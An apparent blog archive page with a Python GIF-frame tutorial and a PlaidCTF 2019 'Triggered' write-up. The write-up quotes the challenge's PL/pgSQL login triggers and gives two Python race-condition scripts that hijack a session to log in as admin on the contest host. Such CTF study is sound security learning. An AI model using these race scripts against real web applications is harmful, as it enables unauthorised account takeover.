<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Page 3 | </title>

  
  <meta name="author" content="damn1t">
  

  

  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  

  <meta property="og:site_name" content=""/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
</head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/"></a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    
  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/23/图像/py_gif/"><span>python gif图的拆解和合成</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/23/图像/py_gif/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-23T05:44:38.456Z">
          2019-04-23
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="python-gif图的拆解和合成"><a href="#python-gif图的拆解和合成" class="headerlink" title="python gif图的拆解和合成"></a>python gif图的拆解和合成</h1><h2 id="拆解"><a href="#拆解" class="headerlink" title="拆解"></a>拆解</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import os</span><br><span class="line">gifFileName = &apos;test.gif&apos;</span><br><span class="line">#使用Image模块的open()方法打开gif动态图像时，默认是第一帧</span><br><span class="line">im = Image.open(gifFileName)</span><br><span class="line">pngDir = gifFileName[:-4]</span><br><span class="line">#创建存放每帧图片的文件夹</span><br><span class="line">os.mkdir(pngDir)</span><br><span class="line">try:</span><br><span class="line">  while True:</span><br><span class="line">    #保存当前帧图片</span><br><span class="line">    current = im.tell()</span><br><span class="line">    im.save(pngDir+&apos;/&apos;+str(current)+&apos;.png&apos;)</span><br><span class="line">    #获取下一帧图片</span><br><span class="line">    im.seek(current+1)</span><br><span class="line">except EOFError:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding: UTF-8 -*-  </span><br><span class="line"> </span><br><span class="line">import os</span><br><span class="line">from PIL import Image</span><br><span class="line"> </span><br><span class="line">def analyseImage(path):</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    Pre-process pass over the image to determine the mode (full or additive).</span><br><span class="line">    Necessary as assessing single frames isn&apos;t reliable. Need to know the mode </span><br><span class="line">    before processing all frames.</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    im = Image.open(path)</span><br><span class="line">    results = &#123;</span><br><span class="line">        &apos;size&apos;: im.size,</span><br><span class="line">        &apos;mode&apos;: &apos;full&apos;,</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            if im.tile:</span><br><span class="line">                tile = im.tile[0]</span><br><span class="line">                update_region = tile[1]</span><br><span class="line">                update_region_dimensions = update_region[2:]</span><br><span class="line">                if update_region_dimensions != im.size:</span><br><span class="line">                    results[&apos;mode&apos;] = &apos;partial&apos;</span><br><span class="line">                    break</span><br><span class="line">            im.seek(im.tell() + 1)</span><br><span class="line">    except EOFError:</span><br><span class="line">        pass</span><br><span class="line">    return results</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def processImage(path):</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    Iterate the GIF, extracting each frame.</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    mode = analyseImage(path)[&apos;mode&apos;]</span><br><span class="line">    </span><br><span class="line">    im = Image.open(path)</span><br><span class="line"> </span><br><span class="line">    i = 0</span><br><span class="line">    p = im.getpalette()</span><br><span class="line">    last_frame = im.convert(&apos;RGBA&apos;)</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            print (&quot;saving %s (%s) frame %d, %s %s&quot; % (path, mode, i, im.size, im.tile))</span><br><span class="line">            </span><br><span class="line">            &apos;&apos;&apos;</span><br><span class="line">            If the GIF uses local colour tables, each frame will have its own palette.</span><br><span class="line">            If not, we need to apply the global palette to the new frame.</span><br><span class="line">            &apos;&apos;&apos;</span><br><span class="line">            if not im.getpalette():</span><br><span class="line">                im.putpalette(p)</span><br><span class="line">            </span><br><span class="line">            new_frame = Image.new(&apos;RGBA&apos;, im.size)</span><br><span class="line">            </span><br><span class="line">            &apos;&apos;&apos;</span><br><span class="line">            Is this file a &quot;partial&quot;-mode GIF where frames update a region of a different size to the entire image?</span><br><span class="line">            If so, we need to construct the new frame by pasting it on top of the preceding frames.</span><br><span class="line">            &apos;&apos;&apos;</span><br><span class="line">            if mode == &apos;partial&apos;:</span><br><span class="line">                new_frame.paste(last_frame)</span><br><span class="line">            </span><br><span class="line">            new_frame.paste(im, (0,0), im.convert(&apos;RGBA&apos;))</span><br><span class="line">            new_frame.save(&apos;%s-%d.png&apos; % (&apos;&apos;.join(os.path.basename(path).split(&apos;.&apos;)[:-1]), i), &apos;PNG&apos;)</span><br><span class="line"> </span><br><span class="line">            i += 1</span><br><span class="line">            last_frame = new_frame</span><br><span class="line">            im.seek(im.tell() + 1)</span><br><span class="line">    except EOFError:</span><br><span class="line">        pass</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def main():</span><br><span class="line">    processImage(&apos;1.gif&apos;)</span><br><span class="line">    </span><br><span class="line"> </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="合成"><a href="#合成" class="headerlink" title="合成"></a>合成</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import imageio</span><br><span class="line">import os</span><br><span class="line"> </span><br><span class="line">def create_gif(image_list, gif_name):</span><br><span class="line"> </span><br><span class="line">    frames = []</span><br><span class="line">    for image_name in image_list:</span><br><span class="line">        path = &apos;C:\\Users\\admin\\Desktop\\1\\&apos;</span><br><span class="line">        frames.append(imageio.imread(path+image_name))</span><br><span class="line">    # Save them as frames into a gif </span><br><span class="line">    imageio.mimsave(gif_name, frames, &apos;GIF&apos;, duration = 0.1)</span><br><span class="line"> </span><br><span class="line">    return</span><br><span class="line"> </span><br><span class="line">def main():</span><br><span class="line">    path = &apos;C:\\Users\\admin\\Desktop\\1\\&apos;</span><br><span class="line">    files = os.listdir(path)</span><br><span class="line">    files.sort(key=lambda x:int(x[:-4]))</span><br><span class="line">    gif_name = &apos;created_gif.gif&apos;</span><br><span class="line">    create_gif(files, gif_name)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="倒放"><a href="#倒放" class="headerlink" title="倒放"></a>倒放</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#   _*_ coding:utf-8 _*_</span><br><span class="line"> </span><br><span class="line">from PIL import Image, ImageSequence</span><br><span class="line"> </span><br><span class="line">__author__ = &apos;admin&apos;</span><br><span class="line"> </span><br><span class="line">im = Image.open(r&apos;C:\\Users\\admin\\Desktop\\1.gif&apos;)</span><br><span class="line">#   初始化列表</span><br><span class="line">sequence = []</span><br><span class="line">for f in ImageSequence.Iterator(im):</span><br><span class="line">    #   获取图像序列病存储</span><br><span class="line">    sequence.append(f.copy())</span><br><span class="line">#   将图像序列逆转</span><br><span class="line">sequence.reverse()</span><br><span class="line">sequence[0].save(r&apos;C:\\Users\\admin\\Desktop\\out.gif&apos;, save_all=True, append_images=sequence[1:])</span><br></pre></td></tr></table></figure>
<h2 id="随机排列"><a href="#随机排列" class="headerlink" title="随机排列"></a>随机排列</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#   _*_ coding:utf-8 _*_</span><br><span class="line">import random</span><br><span class="line">from PIL import Image, ImageSequence</span><br><span class="line"> </span><br><span class="line">__author__ = &apos;admin&apos;</span><br><span class="line"> </span><br><span class="line">im = Image.open(r&apos;C:\\Users\\admin\\Desktop\\1.gif&apos;)</span><br><span class="line">#   初始化列表</span><br><span class="line">sequence = []</span><br><span class="line">for f in ImageSequence.Iterator(im):</span><br><span class="line">    #   获取图像序列病存储</span><br><span class="line">    sequence.append(f.copy())</span><br><span class="line">#   随机打乱图像序列</span><br><span class="line">random.shuffle(sequence)</span><br><span class="line">#   将图像序列逆转</span><br><span class="line"># sequence.reverse()</span><br><span class="line">sequence[0].save(r&apos;C:\\Users\\admin\\Desktop\\d.gif&apos;, save_all=True, append_images=sequence[1:])</span><br></pre></td></tr></table></figure>
      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/gif/">gif</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/21/CTF/plaidctf2019/"><span>plaidctf2019</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/21/CTF/plaidctf2019/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-21T12:18:08.494Z">
          2019-04-21
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="plaidctf2019"><a href="#plaidctf2019" class="headerlink" title="plaidctf2019"></a>plaidctf2019</h1><h2 id="Triggered（web）"><a href="#Triggered（web）" class="headerlink" title="Triggered（web）"></a>Triggered（web）</h2><p><img src="https://i.imgur.com/sc0Owm3.png" alt=""><br>首页的一段话提示了一点，要试图登录admin角色，页面功能分为登录，注册，先注册随意账号并登陆：<br><img src="https://i.imgur.com/9dUEnVr.png" alt=""><br>有<strong>查询</strong>和<strong>添加主题</strong>两个功能，尝试了一下，<strong>new note</strong>没法xss，所以可能就是查询了，以admin的身份进行flag查询<br>分析代码，服了，存sql写的，<a href="https://www.postgresql.org/docs/9.6/plpgsql-structure.html" target="_blank" rel="noopener">pl/pgsql</a>(以postgresql支持)</p>
<p>关注登录过程：<br>用户：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">---------- POST /login</span><br><span class="line"></span><br><span class="line">CREATE FUNCTION web.handle_post_login() RETURNS TRIGGER AS $$</span><br><span class="line">DECLARE</span><br><span class="line">  form_username text;</span><br><span class="line">  session_uid uuid;</span><br><span class="line">  form_user_uid uuid;</span><br><span class="line">  context jsonb;</span><br><span class="line">BEGIN</span><br><span class="line">  SELECT</span><br><span class="line">    web.get_form(NEW.uid, &apos;username&apos;)</span><br><span class="line">  INTO form_username;</span><br><span class="line"></span><br><span class="line">  SELECT</span><br><span class="line">    web.get_cookie(NEW.uid, &apos;session&apos;)::uuid</span><br><span class="line">  INTO session_uid;</span><br><span class="line"></span><br><span class="line">  SELECT</span><br><span class="line">    uid</span><br><span class="line">  FROM</span><br><span class="line">    web.user</span><br><span class="line">  WHERE</span><br><span class="line">    username = form_username</span><br><span class="line">  INTO form_user_uid;</span><br><span class="line"></span><br><span class="line">  IF form_user_uid IS NOT NULL</span><br><span class="line">  THEN</span><br><span class="line">    INSERT INTO web.session (</span><br><span class="line">      uid,</span><br><span class="line">      user_uid,</span><br><span class="line">      logged_in</span><br><span class="line">    ) VALUES (</span><br><span class="line">      COALESCE(session_uid, uuid_generate_v4()),</span><br><span class="line">      form_user_uid,</span><br><span class="line">      FALSE</span><br><span class="line">    )</span><br><span class="line">    ON CONFLICT (uid)</span><br><span class="line">      DO UPDATE</span><br><span class="line">      SET</span><br><span class="line">        user_uid = form_user_uid,</span><br><span class="line">        logged_in = FALSE</span><br><span class="line">    RETURNING uid</span><br><span class="line">    INTO session_uid;</span><br><span class="line"></span><br><span class="line">    PERFORM web.set_cookie(NEW.uid, &apos;session&apos;, session_uid::text);</span><br><span class="line">    PERFORM web.respond_with_redirect(NEW.uid, &apos;/login/password&apos;);</span><br><span class="line">  ELSE</span><br><span class="line">    PERFORM web.respond_with_redirect(NEW.uid, &apos;/login&apos;);</span><br><span class="line">  END IF;</span><br><span class="line"></span><br><span class="line">  RETURN NEW;</span><br><span class="line">END;</span><br><span class="line">$$ LANGUAGE plpgsql;</span><br><span class="line"></span><br><span class="line">CREATE TRIGGER route_post_login</span><br><span class="line">  BEFORE INSERT</span><br><span class="line">  ON web.request</span><br><span class="line">  FOR EACH ROW</span><br><span class="line">  WHEN (NEW.path = &apos;/login&apos; AND NEW.method = &apos;POST&apos;)</span><br><span class="line">  EXECUTE PROCEDURE web.handle_post_login();</span><br></pre></td></tr></table></figure></p>
<p>密码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">---------- POST /login/password</span><br><span class="line"></span><br><span class="line">CREATE FUNCTION web.handle_post_login_password() RETURNS TRIGGER AS $$</span><br><span class="line">DECLARE</span><br><span class="line">  form_password text;</span><br><span class="line">  session_uid uuid;</span><br><span class="line">  success boolean;</span><br><span class="line">BEGIN</span><br><span class="line">  SELECT</span><br><span class="line">    web.get_cookie(NEW.uid, &apos;session&apos;)::uuid</span><br><span class="line">  INTO session_uid;</span><br><span class="line"></span><br><span class="line">  IF session_uid IS NULL</span><br><span class="line">  THEN</span><br><span class="line">    PERFORM web.respond_with_redirect(NEW.uid, &apos;/login&apos;);</span><br><span class="line">    RETURN NEW;</span><br><span class="line">  END IF;</span><br><span class="line"></span><br><span class="line">  SELECT</span><br><span class="line">    web.get_form(NEW.uid, &apos;password&apos;)</span><br><span class="line">  INTO form_password;</span><br><span class="line"></span><br><span class="line">  IF form_password IS NULL</span><br><span class="line">  THEN</span><br><span class="line">    PERFORM web.respond_with_redirect(NEW.uid, &apos;/login/password&apos;);</span><br><span class="line">    RETURN NEW;</span><br><span class="line">  END IF;</span><br><span class="line"></span><br><span class="line">  SELECT EXISTS (</span><br><span class="line">    SELECT</span><br><span class="line">      *</span><br><span class="line">    FROM</span><br><span class="line">      web.user usr</span><br><span class="line">        INNER JOIN web.session session</span><br><span class="line">          ON usr.uid = session.user_uid</span><br><span class="line">    WHERE</span><br><span class="line">      session.uid = session_uid</span><br><span class="line">        AND usr.password_hash = crypt(form_password, usr.password_hash)</span><br><span class="line">  )</span><br><span class="line">  INTO success;</span><br><span class="line"></span><br><span class="line">  IF success</span><br><span class="line">  THEN</span><br><span class="line">    UPDATE web.session</span><br><span class="line">    SET</span><br><span class="line">      logged_in = TRUE</span><br><span class="line">    WHERE</span><br><span class="line">      uid = session_uid;</span><br><span class="line"></span><br><span class="line">    PERFORM web.respond_with_redirect(NEW.uid, &apos;/&apos;);</span><br><span class="line">  ELSE</span><br><span class="line">    PERFORM web.respond_with_redirect(NEW.uid, &apos;/login/password&apos;);</span><br><span class="line">  END IF;</span><br><span class="line"></span><br><span class="line">  RETURN NEW;</span><br><span class="line">END;</span><br><span class="line">$$ LANGUAGE plpgsql;</span><br><span class="line"></span><br><span class="line">CREATE TRIGGER route_post_login_password</span><br><span class="line">  BEFORE INSERT</span><br><span class="line">  ON web.request</span><br><span class="line">  FOR EACH ROW</span><br><span class="line">  WHEN (NEW.path = &apos;/login/password&apos; AND NEW.method = &apos;POST&apos;)</span><br><span class="line">  EXECUTE PROCEDURE web.handle_post_login_password();</span><br></pre></td></tr></table></figure></p>
<p>登录过程：<br>用户名登入：建立uid,session,将loggin设置为false<br>密码登入：判断session，将session设为true</p>
<p>总过程：</p>
<p>1.获取用户提交的用户名和存储在cookie表中的 session_uid<br>2.根据用户名，从 user表中查询出来 form_user_uid<br>3.然后将 session_uid 和 form_user_uid 和为False的登录状态写入到 session表中，如果session_uid为空(就是用户请求的时候不带session)，则为此用户重新生成一个。 如果 session_uid 在数据库中已经存在，就4.修改这个 session_uid 对应的 user_uid 为当前登录的用户的id，登录状态设置为false 。<br>5.接下来设置 cookie , 并跳转到 /login/password<br>6.接下来是 post 到 /login/password 的处理流程，同样是获取 session_uid和用户输入的password , 然后把 user表和session表以user_uid相等为条件做一个连接，以 session_uid 和 password 为条件做一次查询。<br>如果查询到，就更新用户的session为登录状态</p>
<p>思路就是：</p>
<p>1.非admin用户登陆后，在密码登入的同时给一个线程admin登录，这时admin就可以成功登入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import aiohttp</span><br><span class="line">import asyncio</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># Set to your session cookie value</span><br><span class="line">session_cookie = &#123;&quot;session&quot;: &quot;8fc8c228-6409-4d1f-8677-d8155cd32f04&quot;&#125;</span><br><span class="line">headers        = &#123;&apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;&#125;</span><br><span class="line"></span><br><span class="line">async def doLogin(session, url, username):</span><br><span class="line">    resp = await session.post(url, data=b&quot;username=&quot; + str(username).encode(), headers=headers)</span><br><span class="line">    resp.raise_for_status()</span><br><span class="line">    print(&quot;Got response [&#123;&#125;] for URL: &#123;&#125;&quot;.format(resp.status, url))</span><br><span class="line">    return resp.status</span><br><span class="line"></span><br><span class="line">async def doPassword(session, url):</span><br><span class="line">    resp = await session.post(url, data=b&quot;password=poop&quot;, headers=headers)</span><br><span class="line">    resp.raise_for_status()</span><br><span class="line">    print(&quot;Got response [&#123;&#125;] for URL: &#123;&#125;&quot;.format(resp.status, url))</span><br><span class="line">    return resp.status</span><br><span class="line"></span><br><span class="line">async def main():</span><br><span class="line">    # force aiohttp to send on different HTTP requests</span><br><span class="line">    conn = aiohttp.TCPConnector(force_close=True)</span><br><span class="line"></span><br><span class="line">    async with aiohttp.ClientSession(connector=conn, cookies=session_cookie) as session:</span><br><span class="line">        login_post = doLogin(session, &quot;http://triggered.pwni.ng:52856/login&quot;, &quot;poop&quot;)</span><br><span class="line"></span><br><span class="line">        # Wait for the stage1 to finish</span><br><span class="line">        print(&quot;LOGIN1 = &quot; + str(await login_post))</span><br><span class="line"></span><br><span class="line">        # immediately fire requests</span><br><span class="line">        login_post_race = asyncio.ensure_future(doLogin(session, &quot;http://triggered.pwni.ng:52856/login&quot;, &quot;admin&quot;))</span><br><span class="line">        password_post   = asyncio.ensure_future(doPassword(session, &quot;http://triggered.pwni.ng:52856/login/password&quot;))</span><br><span class="line"></span><br><span class="line">        # wait for both requests to finish</span><br><span class="line">        await password_post</span><br><span class="line">        await login_post_race</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(main())</span><br></pre></td></tr></table></figure>
<p>2.利用query查询间隙的时间窗口登入admin</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">def login(username):</span><br><span class="line"></span><br><span class="line">    url = &quot;http://triggered.pwni.ng:52856/login&quot;</span><br><span class="line">    data = &#123;&quot;username&quot;:username&#125;</span><br><span class="line"></span><br><span class="line">    res = s.post(url,data=data)</span><br><span class="line"></span><br><span class="line">    print(&quot;[*] login with username&quot;)</span><br><span class="line">#     print(res.text)</span><br><span class="line"></span><br><span class="line">def login_password(password):</span><br><span class="line">    url = &quot;http://triggered.pwni.ng:52856/login/password&quot;</span><br><span class="line">    data = &#123;&quot;password&quot;:password&#125;</span><br><span class="line"></span><br><span class="line">    res = s.post(url,data=data)</span><br><span class="line">    print(&quot;[*] login with password&quot;)</span><br><span class="line">#     print(res.text)</span><br><span class="line"></span><br><span class="line">def query(condition):</span><br><span class="line">    url = &quot;http://triggered.pwni.ng:52856/search&quot;</span><br><span class="line">    data = &#123;&quot;query&quot;:condition&#125;</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        res = s.post(url,data=data)</span><br><span class="line">        print(&quot;[*] query a note ...&quot;)</span><br><span class="line">        if &quot;no result&quot; not in res.text:</span><br><span class="line">            print(res.text)</span><br><span class="line">            break</span><br><span class="line">        elif res.status_code != 200 :</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line"></span><br><span class="line">    login(&quot;test&quot;)</span><br><span class="line">    login_password(&quot;123&quot;)</span><br><span class="line"></span><br><span class="line">    t1 = threading.Thread(target=query,args=(&quot; \&quot;PCTF\&quot; or &quot;*10+ &quot; \&quot;PCTF\&quot; &quot; ,))</span><br><span class="line">    t1.start()</span><br><span class="line">    # time.sleep(3)</span><br><span class="line">    t2 = threading.Thread(target=login,args=(&quot;admin&quot;,))</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure>
